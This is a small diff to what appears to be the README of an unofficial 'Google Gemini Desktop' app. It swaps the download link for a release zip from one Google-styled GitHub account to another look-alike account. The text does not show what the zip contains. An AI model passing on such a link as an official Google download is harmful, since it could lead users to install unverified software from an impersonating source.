@@ -8,7 +8,7 @@
 
 
 ## Install
-[Download `gemini_desktop.zip`](https://github.com/googlegemini-ai/Google-Gemini-Desktop/releases/download/v0.12.2/gemini_desktop.zip)
+[Download `gemini_desktop.zip`](https://github.com/googlegeminiapp/Google-Gemini-Desktop/releases/download/v0.12.2/gemini_desktop.zip)
 ---
 
 
